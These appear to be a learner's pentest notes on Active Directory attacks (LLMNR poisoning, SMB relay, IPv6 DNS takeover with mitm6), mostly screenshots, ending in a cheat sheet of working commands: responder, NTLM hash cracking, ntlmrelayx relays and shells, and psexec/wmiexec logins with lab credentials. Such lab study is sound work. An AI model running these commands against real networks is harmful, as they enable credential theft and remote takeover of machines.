#windows #active #internalPentest 

![Exported image](Exported%20image%2020241212232028-0.png)  
![Exported image](Exported%20image%2020241212232031-1.png)  
![Exported image](Exported%20image%2020241212232034-2.png)

**LLMNR is Link local Multi Cast Name Rsolution
this is like dns when dns fails this is used to indentify hosts in a network 
on ebig disadvantage of this is that when we repose to this service it respone back with an username and password**


![Exported image](Exported%20image%2020241212232040-3.png)

**Lets suppose the victim is trying to connect to //hackme but he mistypes and write //hackm insted then the server is going to tell him "i have no idea what you want buddy" 

**then the victim will send a brodcast message to everyone asking about //hackm then we will respoon to him using responder and tell him i know //hackm send we your passwd hash and username hash and i will let you connect to //hackm



![Exported image](Exported%20image%2020241212232042-4.png)  
![Exported image](Exported%20image%2020241212232044-5.png)  
![Exported image](Exported%20image%2020241212232046-6.png)  
![Exported image](Exported%20image%2020241212232048-7.png)  

**Application

![Exported image](Exported%20image%2020241212232051-8.png)  
![Exported image](Exported%20image%2020241212232053-9.png)

![[Pasted image 20250313202143.png]]
**trying to access the attacker smb using its ip**

![Exported image](Exported%20image%2020241212232058-10.png)  
![Exported image](Exported%20image%2020241212232100-11.png)


![Exported image](Exported%20image%2020241212232103-12.png)  
![Exported image](Exported%20image%2020241212232104-13.png)  
![Exported image](Exported%20image%2020241212232106-14.png)  
![Exported image](Exported%20image%2020241212232107-15.png)  
![Exported image](Exported%20image%2020241212232110-16.png)  
![Exported image](Exported%20image%2020241212232115-17.png)  
![Exported image](Exported%20image%2020241212232117-18.png)  
![Exported image](Exported%20image%2020241212232118-19.png)  
![Exported image](Exported%20image%2020241212232120-20.png)  
![Exported image](Exported%20image%2020241212232122-21.png)  
![Exported image](Exported%20image%2020241212232124-22.png)  
![Exported image](Exported%20image%2020241212232127-23.png)  
![Exported image](Exported%20image%2020241212232133-24.png)


![Exported image](Exported%20image%2020241212232136-25.png)
nmap --script=smb2-security-mode.nse -p455 192.168.57.0/24

![Exported image](Exported%20image%2020241212232139-26.png)  
![Exported image](Exported%20image%2020241212232140-27.png)  
![Exported image](Exported%20image%2020241212232143-28.png)  
![Exported image](Exported%20image%2020241212232145-29.png)  
![Exported image](Exported%20image%2020241212232148-30.png)  
![Exported image](Exported%20image%2020241212232153-31.png)  
![Exported image](Exported%20image%2020241212232155-32.png)  
![Exported image](Exported%20image%2020241212232157-33.png)  
![Exported image](Exported%20image%2020241212232200-34.png)
`ntlmrelayx.py`

ntlmrelayx.py -tf targets.txt -smb2support
![Exported image](Exported%20image%2020241212232202-35.png)  
![Exported image](Exported%20image%2020241212232205-36.png)  
![Exported image](Exported%20image%2020241212232207-37.png)  
![Exported image](Exported%20image%2020241212232212-38.png)  
![Exported image](Exported%20image%2020241212232214-39.png)  
![Exported image](Exported%20image%2020241212232216-40.png)  
![Exported image](Exported%20image%2020241212232217-41.png)  
![Exported image](Exported%20image%2020241212232219-42.png)  
![Exported image](Exported%20image%2020241212232221-43.png)  
![Exported image](Exported%20image%2020241212232223-44.png)  
![Exported image](Exported%20image%2020241212232228-45.png)  
![Exported image](Exported%20image%2020241212232230-46.png)  
![Exported image](Exported%20image%2020241212232233-47.png)  
![Exported image](Exported%20image%2020241212232235-48.png)  
![Exported image](Exported%20image%2020241212232237-49.png)  
![Exported image](Exported%20image%2020241212232239-50.png)  
![Exported image](Exported%20image%2020241212232241-51.png)  
![Exported image](Exported%20image%2020241212232246-52.png)  
![Exported image](Exported%20image%2020241212232247-53.png)  
![Exported image](Exported%20image%2020241212232249-54.png)

**the ipv6 attack i will explain this usig the above image ,we mostly use ipv4 insted of ipv6 changes are ipv6 is enabled on your computer but no one is using it 

**so who is managing the dns for ipv6 the answer is no one ,so we are going to act like the DNS for the ipv6 and then use ldap replay to create an account or log in too the domain controler and aslo to enumrate more

**we will utilize the mitm6 tool to automate this process

`message singing enable not required`


![Exported image](Exported%20image%2020241212232251-55.png)  
![Exported image](Exported%20image%2020241212232254-56.png)  
![Exported image](Exported%20image%2020241212232255-57.png)  
![Exported image](Exported%20image%2020241212232258-58.png)  
![Exported image](Exported%20image%2020241212232303-59.png)  
![Exported image](Exported%20image%2020241212232305-60.png)  
![Exported image](Exported%20image%2020241212232307-61.png)  
![Exported image](Exported%20image%2020241212232309-62.png)  
![Exported image](Exported%20image%2020241212232311-63.png)

```
LLMNR Poisininng Attack COmmands

responder -I eth0 -dwv
hashcat -m 5600 -a 0 ntlmhash.txt rockyou.txt --force

SMB relay

nmap --script=smb2-security-mode.nse -p 445 ip
change config of responder
nano /etc/responder/responder.conf
responder -I eth0 -dwv
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -i
above command will give you an interactive shell

psexec.py marvel.local/fcastel:password@123@192.168.72.129
smbexec.py marvel.local/fcastel:password@123@192.168.72.129
wmiexec.py marvel.local/fcastel:password@123@192.168.72.129

IPv6 attacks

mitm6 -d MARVEL.local
ntlmrelayx.py -6 -t ldaps://iptarget -wh fakewpad.marvel.local -l lootme

```

